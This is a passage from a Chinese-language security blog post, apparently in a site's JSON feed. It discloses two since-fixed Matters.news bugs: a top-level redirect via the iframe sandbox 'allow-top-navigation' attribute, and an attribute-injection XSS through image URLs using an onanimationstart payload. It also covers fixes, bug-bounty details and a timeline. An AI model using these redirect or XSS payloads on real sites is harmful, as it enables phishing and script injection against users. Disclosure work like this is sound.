punctuation\">></span></span></code></pre>\n<p>這樣做的話，我就可以把整個網站重新導向到任何地方，一個最簡單能想到的應用就是重新導向到釣魚網站。這樣的釣魚網站成功機率是比較高的，因為使用者可能根本沒有意識到他被重新導向到其他網站了。</p>\n<p>其實瀏覽器針對這樣的重新導向是有防禦的，上面的程式碼會出現錯誤：</p>\n<blockquote>\n<p>Unsafe attempt to initiate navigation for frame with origin '<a href=\"https://matters.news\">https://matters.news</a>' from frame with URL '<a href=\"https://53469602917d.ngrok.io/\">https://53469602917d.ngrok.io/</a>'. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See <a href=\"https://www.chromestatus.com/features/5851021045661696\">https://www.chromestatus.com/features/5851021045661696</a>.</p>\n</blockquote>\n<blockquote>\n<p>Uncaught DOMException: Failed to set the 'href' property on 'Location': The current window does not have permission to navigate the target frame to '<a href=\"https://google.com\">https://google.com</a>'</p>\n</blockquote>\n<p>因為不是 same origin，所以會阻止 iframe 對 top level window 做導向。</p>\n<p>但是呢！這個東西是可以繞過的，會運用到 sandbox 這個屬性。這個屬性其實就是在指定嵌入的 iframe 有什麼權限，所以只要改成：<code>&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;</code>，就可以成功對 top level window 重新導向，把整個網站給導走。</p>\n<p>這個漏洞在 <a href=\"https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a\">GitLab</a> 與 <a href=\"https://github.com/hackmdio/codimd/issues/1263\">codimd</a> 都有出現過。</p>\n<p>這邊的修正方式有幾個，第一個是可以先把 sandbox 這個屬性拿掉，讓這個屬性不能被使用。如果真的有地方需要用到的話，就需要檢查裡面的值，把比較危險的 <code>allow-top-navigation</code> 給拿掉。</p>\n<p>再來的話也可以限制 iframe src 的位置，可以在不同層面做掉，例如說在程式碼裡面自己過濾 src，只允許特定 domain，或者是用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src\">CSP:frame-src</a> 讓瀏覽器把這些不符合的 domain 自己擋掉。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\">#</a> 第二個問題：未過濾的 HTML</h2>\n<p>第一個問題能造成最大的危險大概就是重新導向了（codimd 那一篇是說在 Safari 可以做出 XSS 啦，只是我做不出來 QQ），但是除了這個之外，還有一個更大的問題，那就是這邊：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p><code>article.content</code> 是經過 js-xss 過濾後的 HTML 字串，所以是安全的，但這邊經過了一個 <code>optimizeEmbed</code> 去做自訂的轉換，在過濾以後還去改變內容其實是一件比較危險的事，因為如果處理的過程有疏忽，就會造成 XSS 的漏洞。</p>\n<p>在轉換裡面有一段程式碼為：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>${toSizedImageURL({</span> <span class=\"token attr-name\"><span class=\"token namespace\">url:</span></span> <span class=\"token attr-name\">src,</span> <span class=\"token attr-name\"><span class=\"token namespace\">size:</span></span> <span class=\"token attr-name\">'1080w',</span> <span class=\"token attr-name\"><span class=\"token namespace\">ext:</span></span> <span class=\"token attr-name\">'webp'</span> <span class=\"token attr-name\">})}</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>仔細看這段程式碼，如果 <code>${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}</code> 或是 <code>src</code> 我們可以控制的話，就有機會能夠改變屬性的內容，或者是新增屬性上去。</p>\n<p>我原本想插入一個惡意的 src 讓 onerror 變成 <code>onerror=&quot;this.srcset='test';alert(1)&quot;</code> 之類的程式碼，但我後來發現 picture 底下的 source 的 onerror 事件好像是無效的，就算 srcset 有錯也不會觸發，所以是沒用的。</p>\n<p>因此我就把焦點轉向 srcSet 以及插入新的屬性，這邊可以用 <code>onanimationstart</code> 這個屬性，在 animation 開始時會觸發的一個事件，而 animation 的名字可以去 CSS 裡面找，很幸運地找到了一個 keyframe 叫做<code>spinning</code>。</p>\n<p>因此如果 img src 為：<code>https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)</code></p>\n<p>結合後的程式碼就是：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span>   <br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>https://assets.matters.news/processed/1080w/embed/test</span> <br>  <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value css language-css\"><span class=\"token property\">animation-name</span><span class=\"token punctuation\">:</span>spinning</span></span></span> <br>  <span class=\"token attr-name\">onanimationstart</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console.log(1337)</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>如此一來，就製造了一個 XSS 的漏洞：</p>\n<p><img src=\"https://i.imgur.com/nyugLUH.png\" alt=\"\"><br>\n<img src=\"https://i.imgur.com/iYLI0ku.png\" alt=\"\"></p>\n<p>修補方式也有幾個：</p>\n<ol>\n<li>新增 CSP header 阻止 inline script 的執行（這比較難做到，因為可能會跟現有東西牴觸，需要較多時間處理）</li>\n<li>過濾傳進來的 img url（如果過濾不好一樣有風險）</li>\n<li>先改變 HTML，才去呼叫 js-xss 幫你濾掉不該存在的屬性</li>\n</ol>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>我們找到了兩個漏洞：</p>\n<ol>\n<li>透過 <code>&lt;iframe&gt;</code> 把使用者導到任意位置</li>\n<li>透過 <code>&lt;source&gt;</code> 執行文章頁面的 XSS 攻擊</li>\n</ol>\n<p>那實際上到底可以做到什麼樣的攻擊呢？</p>\n<p>可以先用第二個漏洞發表一篇有 XSS 攻擊的文章，再寫一個機器人去所有文章底下留言，利用 <code>&lt;iframe&gt;</code> 把使用者導到具有 XSS 的文章。如此一來，只要使用者點擊任何一篇文章都會被攻擊到。</p>\n<p>不過網站本身其他地方的防禦做得不錯，儘管有 XSS 但 Cookie 是 HttpOnly 的所以偷不走，修改密碼是用寄信的所以也沒辦法修改密碼，似乎沒辦法做到真的太嚴重的事情。</p>\n<p>許多過濾 XSS 的 library 本身是安全的（雖然有些時候其實還是會被發現<a href=\"https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\">漏洞</a>），但使用 library 的人可能忽略了一些設定或者是額外做了一些事情，導致最後產生出來的 HTML 依然是不安全的。</p>\n<p>在處理與使用者輸入相關的地方時，應該對於每一個環節都重新檢視一遍，看看是否有疏忽的地方。</p>\n<p>CSP 的 header 也建議設定一下，至少在真的被 XSS 時還有最後一道防線擋住。雖然說 CSP 有些規則也可以被繞過，但至少比什麼都沒有好。</p>\n<p>Matters 有自己的 <a href=\"https://github.com/thematters/developer-resource/blob/master/SECURITY.md\">Bug Bounty Program</a>，只要找到能證明危害的漏洞都有獎金可以拿，這篇找到的 XSS 漏洞被歸類在 High，價值 150 元美金。他們團隊相信開源能惠及技術人員，也能讓網站更安全，因此希望大家知道這個計畫的存在。</p>\n<p>最後，感謝 Matters 團隊快速的回覆以及處理，也感謝 Cymetrics 的同事們。</p>\n<p>時間軸：</p>\n<ul>\n<li>2021–05–07 回報漏洞</li>\n<li>2021–05–12 收到 Matters 團隊確認信，正在修補漏洞</li>\n<li>2021–05–12 詢問修補完是否能發表文章，獲得許可</li>\n<li>2021–05–13 修復完成</li>\n</ul>\n",
      "date_published": "2021-05-15T08:00:00+08:00"
    }
  ]
}
